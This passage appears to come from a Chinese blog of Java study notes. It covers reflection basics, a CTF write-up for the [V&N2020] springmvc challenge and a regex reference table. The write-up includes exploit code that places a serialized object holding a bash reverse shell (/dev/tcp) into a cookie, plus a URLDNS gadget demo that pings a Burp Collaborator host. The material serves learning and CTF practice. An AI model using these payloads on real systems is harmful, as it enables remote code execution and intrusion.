class="comment">// getFields获取public的属性</span></span><br><span class="line">        <span class="comment">// getDeclaredFields获取所有属性</span></span><br><span class="line"><span class="comment">//        Field[] fields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f : fields)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// getField只能获取public的属性</span></span><br><span class="line">        <span class="comment">// 不能修改私有属性的值 访问</span></span><br><span class="line">        Field name = c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实现对私有属性变量的访问和修改</span></span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(student1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] method = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m : method)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果方法无参数则如下</span></span><br><span class="line">        Method action = c.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        action.invoke(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果方法有参数 要说明调用函数的参数的数据类型</span></span><br><span class="line">        <span class="comment">// 然后也要注意如果方法是私有属性的方法 不能随意访问</span></span><br><span class="line">        Method action1 = c.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 实现对私有属性的方法的访问</span></span><br><span class="line">        action.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        action1.invoke(student1,<span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="V-amp-N2020公开赛-springmvc"><a href="#V-amp-N2020公开赛-springmvc" class="headerlink" title="[V&amp;N2020公开赛]springmvc"></a>[V&amp;N2020公开赛]springmvc</h5><p><a href="buuoj.cn">buuoj.cn</a></p>
<p><u>1.先自己做</u></p>
<p>因为还没学过Spring框架，也不会搭，就先自己随便看看代码了</p>
<p>可以发现<code>Tools</code>类是存在<code>Serialize</code>接口的，所以是可以序列化的，并且写了序列化和反序列化的函数，最后还重写了<code>readObject</code>，所以该类应该就是我们可以利用的类</p>
<p>那我们可以先来看看readObject方法，发现可要传入的是反序列化之后的内容，其实应该也算是传入一个对象，然后进行实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       Object obj = in.readObject();</span><br><span class="line">       (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以找找看<code>ProcessBuilder</code>类</p>
<p><img src="https://img-blog.csdnimg.cn/a97256bde2c440d9a1f9804720df1b5b.png" alt="img"></p>
<p>再看看其他的类</p>
<p>可以找到比较特别的类，<code>ClientInfoFilter</code>，因为这里调用了Tools中的序列化函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tools.ClientInfo;</span><br><span class="line"><span class="keyword">import</span> com.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Decoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClentInfoFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClentInfoFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig fcg)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Cookie[] cookies = ((HttpServletRequest)request).getCookies(); <span class="comment">//获取Cookie</span></span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123; <span class="comment">// 如果Cookie不为空</span></span><br><span class="line">            Cookie[] var7 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var8 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var9 = <span class="number">0</span>; var9 &lt; var8; ++var9) &#123;</span><br><span class="line">                Cookie c = var7[var9];</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">&quot;cinfo&quot;</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes;</span><br><span class="line">        <span class="keyword">if</span> (exist) &#123; <span class="comment">// 如果Cookie中的名字为cinfo为true</span></span><br><span class="line">            String b64 = cookie.getValue(); <span class="comment">// 获取内容</span></span><br><span class="line">            Decoder decoder = Base64.getDecoder(); <span class="comment">// base解码</span></span><br><span class="line">            bytes = decoder.decode(b64); <span class="comment">// 转成字节</span></span><br><span class="line">            ClientInfo cinfo = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (!b64.equals(<span class="string">&quot;&quot;</span>) &amp;&amp; bytes != <span class="keyword">null</span>) &#123; <span class="comment">// 如果都不为空</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cinfo = (ClientInfo)Tools.parse(bytes); <span class="comment">// 进行反序列化 并实例化成ClientInfo的对象</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">                    var14.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId()); <span class="comment">// 如果内容为空 则进行实例化</span></span><br><span class="line">                Encoder encoder = Base64.getEncoder();<span class="comment">// base加密</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bytes = Tools.create(cinfo); <span class="comment">// 进行序列化</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                    var15.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                cookie.setValue(encoder.encodeToString(bytes)); <span class="comment">// 设置cookie</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo); </span><br><span class="line">            <span class="comment">// 获取session并增加属性为cinfo 将值传进去</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Encoder encoder = Base64.getEncoder(); <span class="comment">// 如果cookie不存在 将encoder实例化成base64的加密</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClientInfo cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId()); </span><br><span class="line">                bytes = Tools.create(cinfo);</span><br><span class="line">                cookie = <span class="keyword">new</span> Cookie(<span class="string">&quot;cinfo&quot;</span>, encoder.encodeToString(bytes));</span><br><span class="line">                cookie.setMaxAge(<span class="number">86400</span>);</span><br><span class="line">                ((HttpServletResponse)response).addCookie(cookie);</span><br><span class="line">                ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                var13.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计下来，可以发现如果我们要利用这个类的话，那应该是要满足第一个if语句，然后调用反序列化函数，并且要反序列化Tool类，从而执行Tool类里面的readObject方法，然后进行命令执行，虽然大概思路是知道的，但是无从下手（菜</p>
<p>看看别的师傅的wp吧！！</p>
<p><u>2.学习！</u></p>
<p>发现我的思路也对，总的来说就是要把我们伪造的序列化字符串放入cookie中，然后反序列化进行命令执行，那么现在比较难理解的就是该怎么进行命令执行了</p>
<blockquote>
<p>理解：Tools类中还存在一个属性testCall是我们可以利用的，而在最后命令执行的时候会以String[]接收数据，那在序列化的时候将testCall改成String[]然后将命令传进去，那反序列化调用的时候就会执行我们写入的语句</p>
</blockquote>
<p>exp:</p>
<p><code>Tools</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;<span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String[] testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTestCall</span><span class="params">(String[] str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.testCall = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ToolsTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToolsTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Tools tools = <span class="keyword">new</span> Tools();</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/ip/6868 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">        tools.setTestCall(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Tools.create(tools);</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        System.out.println(encoder.encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>URL DNS链</strong></p>
<p>首先可利用的类为<code>HashMap</code>，因为这个类里面重写了<code>readObject</code>等，然后我们的目标是调用<code>HashMap</code>里面的<code>hashCode</code>方法从而产生DNS请求。</p>
<p>而在put的时候就会在hash函数里面调用<code>key.hashCode()</code>方法，但是在测试的时候会发现，就算没有反序列化也会发起请求，这会对我们是否成功而产生迷惑性，所有我们要使得序列化的时候不能发起请求，所有要在一开始hashCode的值不能为-1，但是又要在反序列化之前把hashCode的值改为-1</p>
<p><code>SerializeTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="comment">// 这里不要发起请求</span></span><br><span class="line">        <span class="comment">// 通过java反射</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://zy1ok3czhtt8z7qmwpi4xkxiy942sr.burpcollaborator.net&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field field = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,<span class="number">1223</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashMap.put(new URL(&quot;http://g0h5mkegjavp1os3y6klz1zz0q6gu5.burpcollaborator.net&quot;), 1);</span></span><br><span class="line">        <span class="comment">// hashcode改成-1</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>);</span><br><span class="line">       </span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UnserializeTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream os = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = os.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        unserialize(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（个人还不是特别懂 </p>
<h4 id="三、java正则匹配"><a href="#三、java正则匹配" class="headerlink" title="三、java正则匹配"></a>三、java正则匹配</h4><p><a href="https://www.runoob.com/java/java-regular-expressions.html">菜鸟教程</a></p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\</td>
<td align="left">将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， <strong>n</strong>匹配字符 <strong>n</strong>。<strong>\n</strong> 匹配换行符。序列 <strong>\\** 匹配 *<em>\*</em> ，</strong>\(** 匹配 **(**。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配输入字符串开始的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，^ 还会与”\n”或”\r”之后的位置匹配。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配输入字符串结尾的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，$ 还会与”\n”或”\r”之前的位置匹配。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">零次或多次匹配前面的字符或子表达式。例如，zo* 匹配”z”和”zoo”。* 等效于 {0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">一次或多次匹配前面的字符或子表达式。例如，”zo+”与”zo”和”zoo”匹配，但与”z”不匹配。+ 等效于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">零次或一次匹配前面的字符或子表达式。例如，”do(es)?”匹配”do”或”does”中的”do”。? 等效于 {0,1}。</td>
</tr>
<tr>
<td align="left">{<em>n</em>}</td>
<td align="left"><em>n</em> 是非负整数。正好匹配 <em>n</em> 次。例如，”o{2}”与”Bob”中的”o”不匹配，但与”food”中的两个”o”匹配。</td>
</tr>
<tr>
<td align="left">{<em>n</em>,}</td>
<td align="left"><em>n</em> 是非负整数。至少匹配 <em>n</em> 次。例如，”o{2,}”不匹配”Bob”中的”o”，而匹配”foooood”中的所有 o。”o{1,}”等效于”o+”。”o{0,}”等效于”o*”。</td>
</tr>
<tr>
<td align="left">{<em>n</em>,<em>m</em>}</td>
<td align="left"><em>m</em> 和 <em>n</em> 是非负整数，其中 <em>n</em> &lt;= <em>m</em>。匹配至少 <em>n</em> 次，至多 <em>m</em> 次。例如，”o{1,3}”匹配”fooooood”中的头三个 o。’o{0,1}’ 等效于 ‘o?’。注意：您不能将空格插入逗号和数字之间。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">当此字符紧随任何其他限定符（*、+、?、{<em>n</em>}、{<em>n</em>,}、{<em>n</em>,<em>m</em>}）之后时，匹配模式是”非贪心的”。”非贪心的”模式匹配搜索到的、尽可能短的字符串，而默认的”贪心的”模式匹配搜索到的、尽可能长的字符串。例如，在字符串”oooo”中，”o+?”只匹配单个”o”，而”o+”匹配所有”o”。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配除”\r\n”之外的任何单个字符。若要匹配包括”\r\n”在内的任意字符，请使用诸如”[\s\S]”之类的模式。</td>
</tr>
<tr>
<td align="left">(<em>pattern</em>)</td>
<td align="left">匹配 <em>pattern</em> 并捕获该匹配的子表达式。可以使用 <strong>$0…$9</strong> 属性从结果”匹配”集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用”(“或者”)“。</td>
</tr>
<tr>
<td align="left">(?:<em>pattern</em>)</td>
<td align="left">匹配 <em>pattern</em> 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用”or”字符 (|) 组合模式部件的情况很有用。例如，’industr(?:y|ies) 是比 ‘industry|industries’ 更经济的表达式。</td>
</tr>
<tr>
<td align="left">(?=<em>pattern</em>)</td>
<td align="left">执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 <em>pattern</em> 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?=95|98|NT|2000)’ 匹配”Windows 2000”中的”Windows”，但不匹配”Windows 3.1”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>
</tr>
<tr>
<td align="left">(?!<em>pattern</em>)</td>
<td align="left">执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 <em>pattern</em> 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?!95|98|NT|2000)’ 匹配”Windows 3.1”中的 “Windows”，但不匹配”Windows 2000”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>
</tr>
<tr>
<td align="left"><em>x</em>|<em>y</em></td>
<td align="left">匹配 <em>x</em> 或 <em>y</em>。例如，’z|food’ 匹配”z”或”food”。’(z|f)ood’ 匹配”zood”或”food”。</td>
</tr>
<tr>
<td align="left">[<em>xyz</em>]</td>
<td align="left">字符集。匹配包含的任一字符。例如，”[abc]”匹配”plain”中的”a”。</td>
</tr>
<tr>
<td align="left">[^<em>xyz</em>]</td>
<td align="left">反向字符集。匹配未包含的任何字符。例如，”[^abc]”匹配”plain”中”p”，”l”，”i”，”n”。</td>
</tr>
<tr>
<td align="left">[<em>a-z</em>]</td>
<td align="left">字符范围。匹配指定范围内的任何字符。例如，”[a-z]”匹配”a”到”z”范围内的任何小写字母。</td>
</tr>
<tr>
<td align="left">[^<em>a-z</em>]</td>
<td align="left">反向范围字符。匹配不在指定的范围内的任何字符。例如，”[^a-z]”匹配任何不在”a”到”z”范围内的任何字符。</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">匹配一个字边界，即字与空格间的位置。例如，”er\b”匹配”never”中的”er”，但不匹配”verb”中的”er”。</td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">非字边界匹配。”er\B”匹配”verb”中的”er”，但不匹配”never”中的”er”。</td>
</tr>
<tr>
<td align="left">\c<em>x</em></td>
<td align="left">匹配 <em>x</em> 指示的控制字符。例如，\cM 匹配 Control-M 或回车符。<em>x</em> 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是”c”字符本身。</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">数字字符匹配。等效于 [0-9]。</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">非数字字符匹配。等效于 [^0-9]。</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">换页符匹配。等效于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">换行符匹配。等效于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">匹配一个回车符。等效于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等。与 [ \f\n\r\t\v] 等效。</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任何非空白字符。与 [^ \f\n\r\t\v] 等效。</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">制表符匹配。与 \x09 和 \cI 等效。</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">垂直制表符匹配。与 \x0b 和 \cK 等效。</td>
</tr>
<tr>
<td align="left">\w</td>
<td align="left">匹配任何字类字符，包括下划线。与”[A-Za-z0-9_]”等效。</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">与任何非单词字符匹配。与”[^A-Za-z0-9_]”等效。</td>
</tr>
<tr>
<td align="left">\x<em>n</em></td>
<td align="left">匹配 <em>n</em>，此处的 <em>n</em> 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，”\x41”匹配”A”。”\x041”与”\x04”&amp;”1”等效。允许在正则表达式中使用 ASCII 代码。</td>
</tr>
<tr>
<td align="left">*num*</td>
<td align="left">匹配 <em>num</em>，此处的 <em>num</em> 是一个正整数。到捕获匹配的反向引用。例如，”(.)\1”匹配两个连续的相同字符。</td>
</tr>
<tr>
<td align="left">*n*</td>
<td align="left">标识一个八进制转义码或反向引用。如果 *n* 前面至少有 <em>n</em> 个捕获子表达式，那么 <em>n</em> 是反向引用。否则，如果 <em>n</em> 是八进制数 (0-7)，那么 <em>n</em> 是八进制转义码。</td>
</tr>
<tr>
<td align="left">*nm*</td>
<td align="left">标识一个八进制转义码或反向引用。如果 *nm* 前面至少有 <em>nm</em> 个捕获子表达式，那么 <em>nm</em> 是反向引用。如果 *nm* 前面至少有 <em>n</em> 个捕获，则 <em>n</em> 是反向引用，后面跟有字符 <em>m</em>。如果两种前面的情况都不存在，则 *nm* 匹配八进制值 <em>nm</em>，其中 <em>n</em> 和 <em>m</em> 是八进制数字 (0-7)。</td>
</tr>
<tr>
<td align="left">\nml</td>
<td align="left">当 <em>n</em> 是八进制数 (0-3)，<em>m</em> 和 <em>l</em> 是八进制数 (0-7) 时，匹配八进制转义码 <em>nml</em>。</td>
</tr>
<tr>
<td align="left">\u<em>n</em></td>
<td align="left">匹配 <em>n</em>，其中 <em>n</em> 是以四位十六进制数表示的 Unicode 字符。例如，\u00A9 匹配版权符号 (©)。</td>
</tr>
</tbody></table>
<h5 id="Pattern-Matcher"><a href="#Pattern-Matcher" class="headerlink" title="Pattern Matcher"></a>Pattern Matcher</h5><blockquote>
<p>Pattern.matches()</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Replace</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Pattern.matches</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">boolean</span> res = Pattern.matches(<span class="string">&quot;a|m|e|u|u&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pattern + Matcher</p>
</blockquote>
